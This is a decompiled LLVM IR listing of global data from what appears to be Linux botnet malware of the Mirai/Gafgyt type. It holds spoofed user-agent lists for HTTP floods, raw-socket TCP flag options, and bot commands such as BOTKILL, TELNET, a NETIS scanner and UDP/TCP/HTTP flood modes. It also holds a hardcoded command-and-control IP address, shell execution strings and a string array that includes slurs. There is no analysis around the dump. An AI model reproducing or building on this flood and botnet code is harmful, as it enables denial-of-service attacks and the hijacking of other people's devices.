@global_var_805a278.317 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_805a308.318 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_805a340.319 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_805a360.320 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_805a378.321 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_805a3d0.322 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_805a470.323 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_805a4c4.324 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_805a538.325 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_805a578.326 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_805a630.327 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_805a684.328 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_805a6dc.329 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_805a734.330 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_805a774.331 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_805a7bc.332 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_805a814.333 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_805a880.334 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_805a8d8.335 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_805a928.336 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_805a94c.337 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_805a9a7.338 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_805a9b8.339 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_805a9e8.340 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_805aa0c.341 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_805aa2e.342 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_805aa48.343 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_805aa88.344 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805ab14.345 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805ab5c.346 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805aba4.347 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805abec.348 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805ac34.349 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_805ac88.350 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_805acd8.351 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_805ad44.352 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_805ad98.353 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_805adf4.354 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_805ae50.355 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_805aeb4.356 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_805af10.357 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805af6c.358 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805afc8.359 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805b028.360 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_805b070.361 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_805b108.362 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_805b154.363 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_805b1a0.364 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_805b1f0.365 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_805b238.366 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_805b28c.367 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_805b2dc.368 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_805b324.369 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_805b370.370 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_805b3bc.371 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_805b404.372 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_805b454.373 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_805b4a4.374 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_805b4d8.375 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_805b50c.376 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_805b560.377 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_805a1f8.315, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_805a238.316, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_805a278.317, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_805a308.318, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_805a340.319, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_805a360.320, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_805a378.321, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_805a3d0.322, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_805a470.323, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_805a4c4.324, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_805a538.325, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_805a578.326, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_805a630.327, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_805a684.328, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_805a6dc.329, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_805a734.330, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805a774.331, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_805a7bc.332, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_805a814.333, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_805a880.334, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_805a8d8.335, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_805a928.336, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_805a94c.337, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805a9a7.338, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_805a9b8.339, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_805a9e8.340, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_805aa0c.341, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_805aa2e.342, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_805aa48.343, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_805aa88.344, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805ab14.345, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805ab5c.346, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805aba4.347, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805abec.348, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_805ac34.349, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_805ac88.350, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_805acd8.351, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_805ad44.352, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805ad98.353, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805adf4.354, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_805ae50.355, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805aeb4.356, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805af10.357, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805af6c.358, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_805afc8.359, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_805b028.360, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_805b070.361, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_805b108.362, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_805b154.363, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_805b1a0.364, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_805b1f0.365, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_805b238.366, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_805b28c.367, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_805b2dc.368, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_805b324.369, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_805b370.370, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_805b3bc.371, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_805b404.372, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_805b454.373, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_805b4a4.374, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_805b4d8.375, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_805b50c.376, i32 0, i32 0)]
@global_var_805b670.381 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_805b6ae.382 = constant [6 x i8] c"arfgG\00"
@global_var_805b6b4.383 = constant [9 x i8] c"HBiug655\00"
@global_var_805b6bd.384 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_805b6ca.385 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_805b6de.386 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_805b6ef.387 = constant [12 x i8] c"GJjyur67458\00"
@global_var_805b6fb.388 = constant [12 x i8] c"RYSDk747586\00"
@global_var_805b707.389 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_805b713.390 = constant [10 x i8] c"KHGK7985i\00"
@global_var_805b71d.391 = constant [11 x i8] c"yuituiILYF\00"
@global_var_805b728.392 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_805b736.393 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_805b742.394 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_805b74f.395 = constant [9 x i8] c"ewqdcftr\00"
@global_var_805b758.396 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_805b768.397 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_805b773.398 = constant [12 x i8] c"twehgbferhb\00"
@global_var_805b77f.399 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_805b78b.400 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_805b799.401 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_805b7a7.402 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_805b7b5.403 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_805b7bf.404 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_805b7cd.405 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_805b7db.406 = constant [12 x i8] c"yteytietyue\00"
@global_var_805b7e7.407 = constant [9 x i8] c"qsortEQS\00"
@global_var_805b7f0.408 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_805b800.409 = constant [4 x i8] c"std\00"
@global_var_805b804.410 = constant [4 x i8] c"dts\00"
@global_var_805b808.411 = constant [6 x i8] c"hackz\00"
@global_var_805b80e.412 = constant [7 x i8] c"shdyed\00"
@global_var_805b815.413 = constant [5 x i8] c"http\00"
@global_var_805b81a.414 = constant [10 x i8] c"sghwiondc\00"
@global_var_805b824.415 = constant [7 x i8] c"nigger\00"
@global_var_805b82b.416 = constant [6 x i8] c"pussy\00"
@global_var_805b831.417 = constant [7 x i8] c"faggot\00"
@global_var_805b840.418 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b6ae.382, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b6b4.383, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805b6bd.384, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_805b6ca.385, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805b6de.386, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b6ef.387, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b6fb.388, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b707.389, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b713.390, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b71d.391, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805b728.392, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b736.393, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805b742.394, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b74f.395, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805b758.396, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b768.397, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b773.398, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b77f.399, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805b78b.400, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805b799.401, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805b7a7.402, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b7b5.403, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805b7bf.404, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805b7cd.405, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b7db.406, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805b7e7.407, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805b7f0.408, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b800.409, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b804.410, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b808.411, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805b80e.412, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b815.413, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805b81a.414, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805b824.415, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b82b.416, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805b831.417, i32 0, i32 0)]
@global_var_805b8d0.419 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_805b8ec.420 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_805b90d.421 = constant [4 x i8] c"all\00"
@global_var_805b911.422 = constant i32 2037579820
@global_var_805b913.423 = constant [4 x i8] c"syn\00"
@global_var_805b917.424 = constant [4 x i8] c"rst\00"
@global_var_805b91b.425 = constant [4 x i8] c"fin\00"
@global_var_805b91f.426 = constant [4 x i8] c"ack\00"
@global_var_805b923.427 = constant [4 x i8] c"psh\00"
@global_var_805b927.428 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_805b939.429 = constant [6 x i8] c"PONG!\00"
@global_var_805b93f.430 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_805b94a.431 = constant [10 x i8] c"My IP: %s\00"
@global_var_805b954.432 = constant [8 x i8] c"BOTKILL\00"
@global_var_805b95c.433 = constant [13 x i8] c"Killing Bots\00"
@global_var_805b969.434 = constant [7 x i8] c"LOOPME\00"
@global_var_805b970.435 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_805b980.436 = constant [7 x i8] c"TELNET\00"
@global_var_805b987.437 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_805b997.438 = constant [4 x i8] c"OFF\00"
@global_var_8064710.439 = local_unnamed_addr global i32 0
@global_var_805b99b.440 = constant [5 x i8] c" OFF\00"
@global_var_805b9a0.441 = constant [3 x i8] c"ON\00"
@global_var_805b9a3.442 = constant [6 x i8] c"NETIS\00"
@global_var_805b9a9.443 = constant [25 x i8] c"[NETIS] SCANNER Starting\00"
@global_var_805b9c2.444 = constant [5 x i8] c"HOLD\00"
@global_var_805b9c7.445 = constant [5 x i8] c"JUNK\00"
@global_var_805b9cc.446 = constant [4 x i8] c"UDP\00"
@global_var_805b9d0.447 = constant [5 x i8] c"HTTP\00"
@global_var_805b9d5.448 = constant [4 x i8] c"CNC\00"
@global_var_805b9d9.449 = constant [6 x i8] c"COMBO\00"
@global_var_805b9df.450 = constant [4 x i8] c"STD\00"
@global_var_805b9e3.451 = constant [4 x i8] c"TCP\00"
@global_var_805b9e7.452 = constant [5 x i8] c"STOP\00"
@global_var_805b9ec.453 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_805e0f0.454 = local_unnamed_addr global i32 -1
@global_var_8058ae0.455 = constant [16 x i8] c"188.213.170.176\00"
@global_var_805e040.456 = global [16 x i8]* @global_var_8058ae0.455
@global_var_805e044.457 = local_unnamed_addr global i32 47
@global_var_805b9f8.458 = constant [8 x i8] c"8.8.8.8\00"
@global_var_805ba00.459 = constant [16 x i8] c"/proc/net/route\00"
@global_var_805ba10.460 = constant [11 x i8] c"\0900000000\09\00"
@global_var_805ba1b.462 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_805ba2b.463 = constant [7 x i8] c"SERVER\00"
@global_var_805ba32.464 = constant [7 x i8] c"ROUTER\00"
@global_var_805ba39.465 = constant i32 1752396544
@global_var_805ba3a.466 = constant [5 x i8] c"sshd\00"
@global_var_805ba3f.467 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_805e0ec.468 = local_unnamed_addr global i32 1
@global_var_805ba52.469 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_805ba5f.470 = constant i32 1867251759
@global_var_805ba6c.472 = constant i32 993090331
@global_var_805baae.473 = constant [5 x i8] c"PONG\00"
@global_var_805bab3.474 = constant [4 x i8] c"DUP\00"
@global_var_805bab7.475 = constant [5 x i8] c"MOVE\00"
@global_var_805babc.476 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant i32 2097266
@global_var_805bac6.478 = constant i32 32
@global_var_805e1e8 = external local_unnamed_addr global i32
@global_var_80646e0.484 = global i32 0
@global_var_805c0e0.485 = constant i32 0
@global_var_805e20c.486 = global i32 0
@global_var_805e224.487 = global i32 0
@global_var_805e208.488 = global i32* bitcast (i16* @global_var_805e240.481 to i32*)
@global_var_805c0f8.489 = constant [6 x i8] c"(nil)\00"
@global_var_805c0fe.490 = constant [7 x i8] c"(null)\00"
@global_var_805c105.491 = constant i32 2949163
@global_var_805c172.493 = constant i32 327688
@global_var_805c16a.494 = constant [8 x i8] c" +0-#'I\00"
@global_var_805c118.495 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_805c155.496 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805c14b.497 = constant i32 117506048
@global_var_805c13c.498 = constant i32 331776
@global_var_805c1c0.499 = constant [8 x i8] c"Success\00"
@global_var_805c196.500 = constant [15 x i8] c"Unknown error \00"
@global_var_805d160.501 = constant i32 65536
@global_var_805e440.502 = local_unnamed_addr global i32* @global_var_805d160.501
@global_var_80644c0.503 = global i32 0
@global_var_805cd9c.504 = constant [15 x i8] c"Resolver error\00"
@global_var_805cd22.505 = constant [8 x i8] c"Error 0\00"
@global_var_805cd2a.506 = constant [13 x i8] c"Unknown host\00"
@global_var_805cd37.507 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_805cd50.508 = constant [21 x i8] c"Unknown server error\00"
@global_var_805cd65.509 = constant [32 x i8] c"No address associated with name\00"
@global_var_805cd88.510 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805cd22.505, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805cd2a.506, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_805cd37.507, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_805cd50.508, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_805cd65.509, i32 0, i32 0)]
@global_var_805cdab.511 = constant [3 x i8] c": \00"
@global_var_805cdad.512 = constant i32 0
@global_var_805cd1a.513 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_80644c4.514 = global i32 0
@global_var_80644e0.515 = global i32 0
@global_var_80646ac.516 = global i32 0
@global_var_805e448.517 = global i32 0
@global_var_8064b34.518 = local_unnamed_addr global i32 0
@global_var_8064b28.519 = global i32 0
@global_var_8064720.520 = global i32 0
@global_var_805e330.521 = global i32 0
@global_var_80647cc.523 = global i32 0
@global_var_80647d0.524 = local_unnamed_addr global i32 0
@global_var_80647d4.525 = global i32 0
@global_var_80647e0.526 = local_unnamed_addr global i32 0
@global_var_8064ad4.527 = global i32 0
@global_var_8064afc.528 = local_unnamed_addr global i32 0
@global_var_8064aec.529 = local_unnamed_addr global i32 0
@global_var_8064af0.530 = local_unnamed_addr global i32 0
@global_var_8064af4.531 = local_unnamed_addr global i32 0
@global_var_8064b10.532 = local_unnamed_addr global i32 0
@global_var_8064af8.533 = local_unnamed_addr global i32 0
@global_var_8064b04.534 = local_unnamed_addr global i32 0
@global_var_8064b08.535 = local_unnamed_addr global i32 0
@global_var_8064b14.536 = local_unnamed_addr global i32 0
@global_var_8064ae8.537 = local_unnamed_addr global i32 0
@global_var_8064ae4.539 = local_unnamed_addr global i32 0
@global_var_8064b0c.540 = local_unnamed_addr global i32 0
@global_var_80647dc.541 = local_unnamed_addr global i32 0
@global_var_805e348.542 = global i32 0
@global_var_805e360.544 = global i32 0
@global_var_805e378 = external global i32
@global_var_805e3a4.546 = global i32 -1726662223
@global_var_805e380.547 = local_unnamed_addr global i32* @global_var_805e3a4.546
@global_var_805e37c.548 = global i32* @global_var_805e3a4.546
@global_var_805cdd4.549 = constant i32 0
@global_var_805cdc0.550 = constant i32 0
@global_var_805cde8.551 = constant [3 x i8] c"-c\00"
@global_var_805cdf0.552 = constant [3 x i8] c"sh\00"
@global_var_805cdeb.553 = constant [8 x i8] c"/bin/sh\00"
@global_var_805e420.554 = global i32 0
@global_var_80646c4.555 = local_unnamed_addr global i32 0
@global_var_80646cc.556 = local_unnamed_addr global i32 0
@global_var_805e000.558 = global i32 -1
@global_var_805553b.559 = constant i32 -294069
@global_var_80646d4.560 = local_unnamed_addr global i32 0
@global_var_80646d8.561 = local_unnamed_addr global i32 0
@global_var_805d04c.562 = constant [10 x i8] c"/dev/null\00"
